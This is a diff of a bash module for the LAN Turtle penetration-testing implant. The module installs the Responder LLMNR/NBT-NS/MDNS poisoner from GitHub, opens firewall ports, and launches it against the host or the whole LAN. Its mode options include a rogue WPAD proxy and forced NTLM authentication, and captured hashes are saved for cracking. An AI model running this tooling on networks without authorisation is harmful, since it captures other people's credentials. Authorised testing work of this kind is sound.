@@ -1,18 +1,19 @@
 #!/bin/bash /usr/lib/turtle/turtle_module
 
-# responder by IMcPwn
+# responder by IMcPwn, adapted for Extroot SD storage by nechry
 # http://imcpwn.com
 
-VERSION="2.5"
-DESCRIPTION="Responder - LLMNR, NBT-NS and MDNS poisoner"
+VERSION="2.6"
+DESCRIPTION="Responder (Extroot)- LLMNR, NBT-NS and MDNS poisoner"
 CONF=/tmp/responder.form
 AUTHOR=IMcPwn
 
-RESPTEMPDL="/tmp/ResponderDownload"
+# Responder download location
+RESPTEMPDL="/tmp/Download"
+# Responder download URL
 RESPURL="https://github.com/lgandx/Responder/archive/refs/tags/v3.0.6.0.zip"
-
-RESPROOT="/sd"
-LOOTDIR=$RESPROOT"/loot/quickcreds"
+# use regular location after setup extroot to use SD storage
+RESPROOT="/etc/turtle"
 
 : ${DIALOG_OK=0}
 : ${DIALOG_CANCEL=1}
@@ -54,246 +55,210 @@ function disable_iptables {
   iptables -D INPUT -i eth1 -p tcp --dport 389 -j ACCEPT
   iptables -D INPUT -i eth1 -p tcp --dport 445 -j ACCEPT
   iptables -D INPUT -i eth1 -p tcp --dport 1433 -j ACCEPT
-  iptables -D INPUT -i eth1 -p tcp --dport 3141 -j ACCEPT  
+  iptables -D INPUT -i eth1 -p tcp --dport 3141 -j ACCEPT
+}
+
+function install_responder {
+  # Clean up
+  /bin/rm -rf "$RESPROOT"/Responder/
+  /bin/rm -rf "$RESPTEMPDL"/master.zip*
+  # Create new
+  /bin/mkdir -p "$RESPTEMPDL"
+  # Download and extract
+  /usr/bin/wget --progress=dot "$RESPURL" -O "$RESPTEMPDL"/master.zip 2>&1 | /usr/bin/dialog --progressbox "Download dependency responder" 14 72
+  # Unpack the GitHub download
+  /usr/bin/unzip "$RESPTEMPDL"/master.zip -d "$RESPTEMPDL" 2>&1 | /usr/bin/dialog --progressbox "Unpacking dependency responder" 14 72
+  /bin/mv "$RESPTEMPDL"/Responder-3.0.6.0 "$RESPTEMPDL"/Responder
+  /bin/mv "$RESPTEMPDL"/Responder "$RESPROOT"
+  /bin/rm -rf "$RESPTEMPDL"/master.zip*
+}
+
+function install_dependencies {
+  # Install dependencies
+  /bin/opkg update | /usr/bin/dialog --progressbox "Updating opkg" 14 72
+
+  if [[ ! $(opkg list-installed | grep python-sqlite3) ]]; then
+    echo "Dependency python-sqlite3 not installed. Installing..."
+    check_internet
+    opkg update >/dev/null && opkg install python-sqlite3
+  fi
+
+  if [[ ! $(opkg list-installed | grep python-openssl) ]]; then
+    echo "Dependency python-openssl not installed. Installing..."
+    check_internet
+    opkg update >/dev/null && opkg install python-openssl
+  fi
 }
 
 function start {
-  if [ -s /etc/config/responder ]; 
-  then
+  if [ -s /etc/config/responder ]; then
+    # check if responder is configured
     responder_interface=$(uci get responder.interface)
     responder_log=$(uci get responder.log)
     responder_mode=$(uci get responder.mode)
-    
-    if [[ $responder_interface == "" ]];
-    then
+    # check if interface is configured
+    if [[ $responder_interface == "" ]]; then
       echo "Responder interface not configured."
       exit 1
     fi
-    
-    if [[ $responder_log == "" ]];
-    then
+    # check if log is configured
+    if [[ $responder_log == "" ]]; then
       echo "Responder log location not configured."
       exit 1
     fi
-    
-    if [[ $responder_mode == "" ]];
-    then
+    # check if mode is configured
+    if [[ $responder_mode == "" ]]; then
       echo "Responder mode not configured."
       exit 1
     fi
-  
-    if [[ ! $(opkg list-installed | grep git) ]];
-    then
-      echo "Dependency git not installed. Installing..."
-      check_internet
-      opkg update > /dev/null && opkg install git
-    fi
-    
-    if [[ ! $(opkg list-installed | grep python-sqlite3) ]];
-    then
-      echo "Dependency python-sqlite3 not installed. Installing..."
-      check_internet
-      opkg update > /dev/null && opkg install python-sqlite3
-    fi
 
-    if [[ ! $(opkg list-installed | grep python-openssl) ]];
-    then
-      echo "Dependency python-openssl not installed. Installing..."
-      check_internet
-      opkg update > /dev/null && opkg install python-openssl
-    fi
-    
     # Check if Responder is installed (not the module available in the Turtle "GUI", but the tool taken straight from GitHub)
-    if [[ ! -d "$RESPROOT"/Responder || ! -s "$RESPROOT"/Responder/Responder.py || ! -s "$RESPROOT"/Responder/Responder.conf ]];
-    then
+    # it shares the same location and dependencies as the module quickcreds
+    if [[ ! -d "$RESPROOT"/Responder || ! -s "$RESPROOT"/Responder/Responder.py || ! -s "$RESPROOT"/Responder/Responder.conf ]]; then
       echo "Required Responder files not found. Downloading..."
       check_internet
-      # Clean up
-      /bin/rm -rf "$RESPROOT"/Responder/
-      /bin/rm -rf "$RESPTEMPDL"/master.zip*
-      # Create new
-      /bin/mkdir -p "$RESPTEMPDL"
-      # Download and extract
-      /usr/bin/wget --progress=dot "$RESPURL" -O "$RESPTEMPDL"/master.zip 2>&1 | /usr/bin/dialog --progressbox "Download dependency responder" 14 72
-      # Unpack the GitHub download
-      /usr/bin/unzip "$RESPTEMPDL"/master.zip -d "$RESPTEMPDL" 2>&1 | /usr/bin/dialog --progressbox "Unpacking dependency responder" 14 72
-      /bin/mv "$RESPTEMPDL"/Responder-3.0.6.0 "$RESPTEMPDL"/Responder
-      /bin/mv "$RESPTEMPDL"/Responder "$RESPROOT"/
-      /bin/rm -rf "$RESPTEMPDL"/master.zip*
+      install_dependencies
+      install_responder
     fi
-    
+
     case $responder_mode in
-      1) mode="";;
-      2) mode="-A";;
-      3) mode="-w";;
-      4) mode="-r";;
-      5) mode="-F";;
-      6) mode="-f";;
-      7) mode="-v";;
-      8) mode="-r -F";;
-      9) mode="-r -F -f";;
-      *)
-        echo "Responder configuration not valid."
-        echo "Please re-configure then try again."
-        rm -f /etc/config/responder
-        exit 1
-        ;;
+    1) mode="" ;;
+    2) mode="-A" ;;
+    3) mode="-w" ;;
+    4) mode="-r" ;;
+    5) mode="-F" ;;
+    6) mode="-f" ;;
+    7) mode="-v" ;;
+    8) mode="-r -F" ;;
+    9) mode="-r -F -f" ;;
+    *)
+      echo "Responder configuration not valid."
+      echo "Please re-configure then try again."
+      rm -f /etc/config/responder
+      exit 1
+      ;;
     esac
-  
+
+    # ensure sshfs is running if log is configured to sshfs
+    if [[ $responder_log == "sshfs" ]]; then
+      if ! pgrep sshfs >/dev/null; then
+        echo "SSHFS not running"
+        exit 1
+      fi
+    fi
+
+    # create symlink to logs according to log configuration
     case $responder_log in
-      sshfs)
-        if pgrep sshfs > /dev/null;
-        then
-          if [[ $responder_interface == "eth1" ]];
-          then
-            enable_iptables
-          fi
-          
-          if [ -s "$RESPROOT"/Responder/Responder.db ]; 
-          then
-            rm -f "$RESPROOT"/Responder/Responder.db
-          fi
-          
-          if [[ $(readlink "$RESPROOT"/Responder/logs) != "/sshfs/Responder/logs" || ! -d /sshfs/Responder/logs ]]; 
-          then
-            rm -rf "$RESPROOT"/Responder/logs
-            mkdir -p /sshfs/Responder/logs
-            ln -s /sshfs/Responder/logs "$RESPROOT"/Responder/logs
-          fi
-          
-          echo "python $RESPROOT/Responder/Responder.py $mode -I $responder_interface" | at now
-          echo -e "Responder started in mode $responder_mode against interface $responder_interface\nand logs are being saved to /sshfs/Responder"
-          echo "Logs can be viewed at Configure > log > View log"
-        else 
-          echo "SSHFS not running"
-          exit 1
-        fi
-        ;;
-      tmp)
-        if [[ $responder_interface == "eth1" ]]; 
-        then
-          enable_iptables
-        fi
-        
-        if [ -s "$RESPROOT"/Responder/Responder.db ]; 
-        then
-          rm -f "$RESPROOT"/Responder/Responder.db
-        fi
-        
-        if [[ $(readlink "$RESPROOT"/Responder/logs) != "/tmp/Responder/logs" || ! -d /tmp/Responder/logs ]]; then
-          rm -rf "$RESPROOT"/Responder/logs
-          mkdir -p /tmp/Responder/logs          
-          ln -s /tmp/Responder/logs "$RESPROOT"/Responder/logs
-        fi
-        
-        echo "python $RESPROOT/Responder/Responder.py $mode -I $responder_interface &" | at now
-        echo -e "Responder started in mode $responder_mode against interface $responder_interface\nand logs are being saved to /tmp/Responder"
-        echo "Responder started with pid"
-        pgrep -f Responder.py
-        ;;
-      sd)
-        if [[ $responder_interface == "eth1" ]];
-        then
-          enable_iptables
-        fi
-        
-        if [ -s "$RESPROOT"/Responder/Responder.db ]; 
-        then
-          rm -f "$RESPROOT"/Responder/Responder.db
-        fi
-               
-        echo "python $RESPROOT/Responder/Responder.py $mode -I $responder_interface" | at now
-        echo -e "Responder started in mode $responder_mode against interface $responder_interface\nand logs are being saved to /sd/Responder"
-        echo "Logs can be viewed at Configure > log > View log"        
-        ;;
-      *)
-        echo "Responder configuration not valid."
-        echo "Please re-configure then try again."
-        rm -f /etc/config/responder
-        exit 1
-        ;;
+    sshfs)
+      # check if symlink exists and is correct
+      if [[ $(readlink "$RESPROOT"/Responder/logs) != "/sshfs/Responder/logs" || ! -d /sshfs/Responder/logs ]]; then
+        rm -rf "$RESPROOT"/Responder/logs
+        mkdir -p /sshfs/Responder/logs
+        ln -s /sshfs/Responder/logs "$RESPROOT"/Responder/logs
+      fi
+      ;;
+    tmp)
+      # check if symlink exists and is correct
+      if [[ $(readlink "$RESPROOT"/Responder/logs) != "/tmp/Responder/logs" || ! -d /tmp/Responder/logs ]]; then
+        rm -rf "$RESPROOT"/Responder/logs
+        mkdir -p /tmp/Responder/logs
+        ln -s /tmp/Responder/logs "$RESPROOT"/Responder/logs
+      fi
+      ;;
+    *)
+      echo "Responder configuration not valid."
+      echo "Please re-configure then try again."
+      rm -f /etc/config/responder
+      exit 1
+      ;;
     esac
+    # configure iptables if interface is eth1
+    if [[ $responder_interface == "eth1" ]]; then
+      enable_iptables
+    fi
+    # clear existing responder database if present
+    if [ -s "$RESPROOT"/Responder/Responder.db ]; then
+      rm -f "$RESPROOT"/Responder/Responder.db
+    fi
+    # start responder
+    echo "python /etc/turtle/Responder/Responder.py $mode -I $responder_interface &" | at now
+    # display message
+    echo -e "Responder started in mode $responder_mode against interface $responder_interface\nand logs are being saved to /$responder_log/Responder"
+    echo "Logs can be viewed at Configure > log > View log"
+    echo "Responder started with pid: $(pgrep -f Responder.py)"
   else
     echo "Responder not configured."
     exit 1
-fi
+  fi
 }
 
 function stop {
   responder_interface=$(uci get responder.interface)
-  if [[ $responder_interface == "eth1" ]]; 
-  then
+  if [[ $responder_interface == "eth1" ]]; then
     disable_iptables
   fi
-  if pgrep -f Responder.py > /dev/null; then kill $(pgrep -f Responder.py); fi
+  if pgrep -f Responder.py >/dev/null; then kill $(pgrep -f Responder.py); fi
   echo "Responder stopped"
 }
 
 function status {
-  if ps | grep -w -q [/]sd/Responder/Responder.py; then echo "1"; else echo "0"; fi
+  if ps | grep -w -q [/]$RESPROOT/Responder/Responder.py; then echo "1"; else echo "0"; fi
 }
 
 function check_internet {
-    ping -q -w 5 -c 1 8.8.8.8 &> /dev/null && {
-        :
-    } || {
-        echo -e "\nThe LAN Turtle is currently offline. The previous\noperation requires an internet connection."
-        exit 1
-    }
+  ping -q -w 5 -c 1 8.8.8.8 &>/dev/null && {
+    :
+  } || {
+    echo -e "\nThe LAN Turtle is currently offline. The previous\noperation requires an internet connection."
+    exit 1
+  }
 }
 
 function log {
-dialog --ok-label "Submit" \
-  --title "Responder Log Configuration" \
-  --extra-button \
-  --extra-label "View log" \
-  --help-button \
-  --radiolist "\n\
-The log files can be saved to SSHFS or tmp.\n" 16 60 3\
-    1 "Save log to SSHFS if available." off\
-    2 "Save log to /tmp" off\
-    3 "Save log to /sd" off\
-  2>$CONF
+  dialog --ok-label "Submit" \
+    --title "Responder Log Configuration" \
+    --extra-button \
+    --extra-label "View log" \
+    --help-button \
+    --radiolist "\n\
+The log files can be saved to SSHFS or tmp.\n" 16 60 3 1 "Save log to SSHFS if available." off 2 "Save log to /tmp" off 2>$CONF
   return=$?
   case $return in
-    $DIALOG_OK)
-      LOG=$(cat $CONF)
-      case $LOG in
-        1)
-          uci set responder.log="sshfs"
-          uci commit responder
-          ;;
-        2)
-          uci set responder.log="tmp"
-          uci commit responder
-          ;;
-        3)
-          uci set responder.log="sd"
-          uci commit responder
-          ;;
-  esac
-  configure;;
-    $DIALOG_CANCEL)
-      configure;;
-    $DIALOG_ESC)
-      configure;;
-    $DIALOG_EXTRA)
+  $DIALOG_OK)
+    LOG=$(cat $CONF)
+    case $LOG in
+    1)
+      uci set responder.log="sshfs"
+      uci commit responder
+      ;;
+    2)
+      uci set responder.log="tmp"
+      uci commit responder
+      ;;
+    esac
+    configure
+    ;;
+  $DIALOG_CANCEL)
+    configure
+    ;;
+  $DIALOG_ESC)
+    configure
+    ;;
+  $DIALOG_EXTRA)
     responder_log=$(uci get responder.log)
     case $responder_log in
-      sshfs)
-        dialog --title "/sshfs/Responder/logs/Responder-Session.log" --clear --tailbox "/sshfs/Responder/logs/Responder-Session.log" 18 72
-        ;;
-      tmp)
-        dialog --title "/tmp/Responder/logs/Responder-Session.log" --clear --tailbox "/tmp/Responder/logs/Responder-Session.log" 18 72
-        ;;
-      sd)
-        dialog --title "/sd/Responder/logs/Responder-Session.log" --clear --tailbox "/sd/Responder/logs/Responder-Session.log" 18 72
-        ;;
-      *)
-        echo "Responder log location not configured."
-        ;;
+    sshfs)
+      dialog --title "/sshfs/Responder/logs/Responder-Session.log" --clear --tailbox "/sshfs/Responder/logs/Responder-Session.log" 18 72
+      ;;
+    tmp)
+      dialog --title "/tmp/Responder/logs/Responder-Session.log" --clear --tailbox "/tmp/Responder/logs/Responder-Session.log" 18 72
+      ;;
+    *)
+      echo "Responder log location not configured."
+      ;;
     esac
-    log;;
+    log
+    ;;
   $DIALOG_HELP)
     dialog --title "Help" --msgbox "\n\
 All activity will be logged to Responder-Session.log\n\
@@ -302,37 +267,38 @@ Poisoning will be logged to Poisoners-Session.log\n\n\
 All hashes are dumped an unique file John Jumbo compliant, using this format:\n\
 (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt\n\n\
 " 18 72
-log
+    log
+    ;;
   esac
 }
 
 function interface {
-dialog --ok-label "Submit" \
+  dialog --ok-label "Submit" \
     --title "Responder Interface Configuration" \
     --radiolist "\n\
-Responder can target the Host machine (The computer the LAN Turtle is plugged in to) or the LAN (The network the LAN Turtle is connected to).\n" 16 60 3\
-    1 "Target just the Host machine (br-lan)." off\
-    2 "Target the entire LAN (eth1)." off\
-  2>$CONF
+Responder can target the Host machine (The computer the LAN Turtle is plugged in to) or the LAN (The network the LAN Turtle is connected to).\n" 16 60 3 1 "Target just the Host machine (br-lan)." off 2 "Target the entire LAN (eth1)." off 2>$CONF
   return=$?
   case $return in
-    $DIALOG_OK)
-      INTERFACE=$(cat $CONF)
-      case $INTERFACE in
-        1)
-          uci set responder.interface="br-lan"
-          uci commit responder
-          ;;
-        2)
-          uci set responder.interface="eth1"
-          uci commit responder
-          ;;
-      esac
-    configure;;
-    $DIALOG_CANCEL)
-      configure;;
-    $DIALOG_ESC)
-      configure;;
+  $DIALOG_OK)
+    INTERFACE=$(cat $CONF)
+    case $INTERFACE in
+    1)
+      uci set responder.interface="br-lan"
+      uci commit responder
+      ;;
+    2)
+      uci set responder.interface="eth1"
+      uci commit responder
+      ;;
+    esac
+    configure
+    ;;
+  $DIALOG_CANCEL)
+    configure
+    ;;
+  $DIALOG_ESC)
+    configure
+    ;;
   esac
 }
 
@@ -340,111 +306,116 @@ function mode {
   dialog --ok-label "Submit" \
     --title "Responder Mode" \
     --help-button \
-    --radiolist "Choose mode\n \n" 20 60 10\
-    1 "Default mode" off\
-    2 "Analyze mode" off\
-    3 "Start WPAD rouge proxy server" off\
-    4 "Enable answers for netbios suffix queries" off\
-    5 "Force NTLM/Basic Authentication" off\
-    6 "Fingerprint hosts" off\
-    7 "Enable verbose" off\
-    8 "Options 4 and 5" off\
-    9 "Options 4, 5, and 6" off\
-  2>$CONF
+    --radiolist "Choose mode\n \n" 20 60 10 1 "Default mode" off 2 "Analyze mode" off 3 "Start WPAD rouge proxy server" off 4 "Enable answers for netbios suffix queries" off 5 "Force NTLM/Basic Authentication" off 6 "Fingerprint hosts" off 7 "Enable verbose" off 8 "Options 4 and 5" off 9 "Options 4, 5, and 6" off 2>$CONF
   return=$?
   case $return in
-    $DIALOG_OK)
-      mode=$(cat $CONF)
-      case $mode in
-        1)
-          uci set responder.mode="1"
-          uci commit responder;;
-        2)
-          uci set responder.mode="2"
-          uci commit responder;;
-        3)
-          uci set responder.mode="3"
-          uci commit responder;;
-        4)
-          uci set responder.mode="4"
-          uci commit responder;;
-        5)
-          uci set responder.mode="5"
-          uci commit responder;;
-        6)
-          uci set responder.mode="6"
-          uci commit responder;;
-        7)
-          uci set responder.mode="7"
-          uci commit responder;;
-        8)
-          uci set responder.mode="8"
-          uci commit responder;;
-        9)
-          uci set responder.mode="9"
-          uci commit responder;;
-      esac
-      configure;;
-    $DIALOG_CANCEL)
-      configure;;
-    $DIALOG_ESC)
-      configure;;
-    $DIALOG_HELP)
+  $DIALOG_OK)
+    mode=$(cat $CONF)
+    case $mode in
+    1)
+      uci set responder.mode="1"
+      uci commit responder
+      ;;
+    2)
+      uci set responder.mode="2"
+      uci commit responder
+      ;;
+    3)
+      uci set responder.mode="3"
+      uci commit responder
+      ;;
+    4)
+      uci set responder.mode="4"
+      uci commit responder
+      ;;
+    5)
+      uci set responder.mode="5"
+      uci commit responder
+      ;;
+    6)
+      uci set responder.mode="6"
+      uci commit responder
+      ;;
+    7)
+      uci set responder.mode="7"
+      uci commit responder
+      ;;
+    8)
+      uci set responder.mode="8"
+      uci commit responder
+      ;;
+    9)
+      uci set responder.mode="9"
+      uci commit responder
+      ;;
+    esac
+    configure
+    ;;
+  $DIALOG_CANCEL)
+    configure
+    ;;
+  $DIALOG_ESC)
+    configure
+    ;;
+  $DIALOG_HELP)
     dialog --title "Help" --msgbox "\n\
 Responder is an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409).\n\
 By default, the tool will only answer to File Server Service request, which is for SMB.\n\n\
 The concept behind this is to target our answers, and be stealthier on the network. This also helps to ensure that we don't break legitimate NBT-NS behavior.\n\n\
 For more information, see: https://github.com/lgandx/Responder\n\
 " 18 72
-mode
+    mode
+    ;;
   esac
 }
 
 function responderconf {
-dialog \
+  dialog \
     --help-button \
     --title "Editing: "$RESPROOT"/Responder/Responder.conf" \
-    --editbox "$RESPROOT"/Responder/Responder.conf 18 72\
-  2>$CONF
+    --editbox "$RESPROOT"/Responder/Responder.conf 18 72 2>$CONF
   return=$?
   case $return in
-    $DIALOG_OK)
-      cat $CONF | {
-        cat $CONF > "$RESPROOT"/Responder/Responder.conf
-        rm $CONF
-        configure
-      };;
-    $DIALOG_HELP)
-      dialog --title "Help" \
-        --msgbox "For information on this configuration, see: https://github.com/lgandx/Responder" 20 60
-      responderconf;;
-    $DIALOG_CANCEL)
+  $DIALOG_OK)
+    cat $CONF | {
+      cat $CONF >"$RESPROOT"/Responder/Responder.conf
       rm $CONF
-      configure;;
-    $DIALOG_ESC)
-      rm $CONF
-      configure;;
+      configure
+    }
+    ;;
+  $DIALOG_HELP)
+    dialog --title "Help" \
+      --msgbox "For information on this configuration, see: https://github.com/lgandx/Responder" 20 60
+    responderconf
+    ;;
+  $DIALOG_CANCEL)
+    rm $CONF
+    configure
+    ;;
+  $DIALOG_ESC)
+    rm $CONF
+    configure
+    ;;
   esac
 }
 
 function configure {
-if [[ ! -s /etc/config/responder ]];
-then
-  touch /etc/config/responder
-fi
+  if [[ ! -s /etc/config/responder ]]; then
+    touch /etc/config/responder
+  fi
 
   dialog --title "" --menu "" 15 60 5 \
-    "log"             "Specify log location" \
-    "interface"       "Specify interface to target" \
-    "mode"            "Specify Responder mode" \
-    "responderconf"   "Edit Responder.conf" \
-    "back"            "Return to previous menu" 2> $CONF
+    "log" "Specify log location" \
+    "interface" "Specify interface to target" \
+    "mode" "Specify Responder mode" \
+    "responderconf" "Edit Responder.conf" \
+    "back" "Return to previous menu" 2>$CONF
   result=$(cat $CONF && rm $CONF &>/dev/null)
   case $result in
-    "log") log;;
-    "interface") interface;;
-    "mode") mode;;
-    "responderconf") responderconf;;
-    "back") exit;;
+  "log") log ;;
+  "interface") interface ;;
+  "mode") mode ;;
+  "responderconf") responderconf ;;
+  "back") exit ;;
   esac
 }
